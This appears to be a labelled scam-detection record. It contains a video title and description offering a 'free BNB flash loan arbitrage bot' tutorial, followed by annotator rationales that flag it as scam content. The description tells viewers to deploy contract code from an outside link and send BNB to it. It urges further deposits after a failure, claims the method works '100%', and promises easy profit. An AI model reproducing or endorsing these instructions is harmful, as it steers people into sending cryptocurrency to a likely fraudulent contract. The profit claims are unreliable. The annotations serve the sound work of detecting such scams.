title: LEARN HOW TO MAKE FREE BNB FLASH LOANS ARBITRAGE BOT.
description: Flash loans are a type of uncollateralized lending that have become very popular in decentralized finance (DeFi). While they've proved popular, flash loan exploits have been used to attack vulnerable DeFi protocols and steal millions of dollars.  So, what's the catch?   A flash loan has to be borrowed and repaid within the same blockchain transaction. NEWEST BNB FLASH LOAN ARBITRAGE EASILY PROFIT METHOD.  Step By Step Tutorial for Flash Loan:   1. Get the Metamask Extension for your browser 2. Open http://remix.ethereum.org/ from within your browser. 3. Click on File Explorers and click "Create New File ". 4. Name the file flashloans.sol and paste the contract code link below. ► https://get-flashloan.com/smart-code-0-5-0-eth-bnb-7844/ 5. Click on Deploy & Run transactions  and set "ENVIRONMENT" to Injected Web3. 6. Connect your MetaMask wallet. 7. Click on the "Solidity Compiler" and set the compiler version to 0.5.0 8. Click on the Solidity Compiler and then click the blue button "Compile flashloans.sol" 9. Wait for the code to compile. 10. Click on Deploy & run transactions then click on the down arrow right from the "Deploy" button 11. On "_TOKENNAME" mytoken 12. On "_TOKENSYMBOL" LOP 13. On "_LOANAMOUNT" 1000 14. Click Transact and confirm the transaction in MetaMask. 15. Wait for the transaction to confirm. 16. Copy the address of the newly deployed contract. 17. Send BNB to the deployed contract to initiate the swap 0.2+ (0.3 up is better as you will get a bigger amount in each swap) 18. Wait for the transaction to confirm. 19. Now, Click "action" (red box) to execute the Flash Loan. 20. Confirm the transaction in MetaMask and wait for the confirmation. 21. You can now check your wallet    Note: if it doesn't work with 0.2 BNB try to send another 0.2 BNB (0.30 is better), because fees may be different from day to day. (1.5+ BNB for each 1000 BNB you are borrowing)  Avoid using very low amounts as contract may fail below 0.15 BNB.  Under some very rare cases, the arbitrage might fail due to depletion of BNB in your smart contract as gas price varies from time to time. Don't panic, all you have to do is wait a little while(5 -10 mins) and retry the transaction this time preferably with 825 loan amount and 31,560 gas limit and it should work 100% but with a smaller profit.  Make sure to transfer your BNB out to another wallet when you're done.  -Hashtags- flash loan arbitrage, flash loan arbitrage bot, flash loan arbitrage tutorial, flash loan arbitrage code, flash loan The Binance logo appears as an opening/closing visual, while the transaction workflow itself is shown in a Remix IDE and browser wallet interface.

annotation.contextual_rationale: This video is scam content because it promotes an easy-profit BNB flash-loan arbitrage method while directing viewers to deploy a contract and send BNB to it. It encourages an additional transfer after failure and claims the method should work 100% under recommended settings. The speaker also describes using a token as a decoy to conceal arbitrage from PancakeSwap, although the available video evidence does not establish ownership, actual profitability, or a completed loss.
annotation.fine_grained_rationale: The content presents a flash-loan and arbitrage workflow linked to purported BNB profit, contract deployment and activation, and funding with BNB. The speaker explicitly presents a decoy token as a way to conceal arbitrage activity from PancakeSwap. This supports an observed concealment or bypass mechanism, but does not establish that the mechanism succeeds or violates a platform rule.
